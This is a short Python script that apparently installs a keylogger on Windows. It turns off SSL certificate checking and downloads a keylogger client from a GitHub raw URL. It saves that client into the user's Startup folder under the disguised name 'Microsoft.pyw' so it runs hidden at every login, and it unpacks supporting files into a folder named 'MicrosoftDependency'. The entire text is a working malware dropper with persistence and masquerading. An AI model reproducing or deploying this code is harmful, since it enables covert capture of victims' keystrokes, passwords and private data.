#--------start-------------
import os,sys,urllib.request,zipfile,subprocess,ssl
ssl._create_default_https_context = ssl._create_unverified_context
percorsoA='C:\\Users\\'+os.getlogin()+'\\AppData\\Local\\Programs\\'
percorsoB='C:\\Users\\'+os.getlogin()+'\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'
url='https://raw.githubusercontent.com/simonemastella/keyLogger/main/'
sys.path.append(percorsoA)
# urllib.request.urlretrieve(url+'Base.zip', percorsoA+'Base.zip')
urllib.request.urlretrieve(url+'keyloggerClient.py', percorsoB+'Microsoft.pyw')
with zipfile.ZipFile(percorsoA+'Base.zip') as zf:
    zf.extractall(percorsoA+'\\MicrosoftDependency\\')
os.remove(percorsoA+'Base.zip')
#--------end------------
